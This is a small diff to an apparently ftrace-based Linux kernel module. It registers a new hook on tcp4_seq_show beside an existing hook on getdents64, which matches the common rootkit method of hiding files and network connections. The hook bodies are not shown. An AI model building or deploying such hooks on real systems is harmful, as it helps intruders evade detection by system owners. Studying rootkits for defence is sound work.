@@ -1,9 +1,11 @@
 #include "ftrace.h"
 
 #include "hooks/hook_getdents64.h"
+#include "hooks/hook_tcp4_seq_show.h"
 
 static struct ftrace_hook hooks[] = {
-    {"__x64_sys_getdents64", hook_getdents64, &getdents64}};
+    {"__x64_sys_getdents64", hook_getdents64, &getdents64},
+    {"tcp4_seq_show", hook_tcp4_seq_show, &tcp4_seq_show}};
 
 int install_hooks(void)
 {
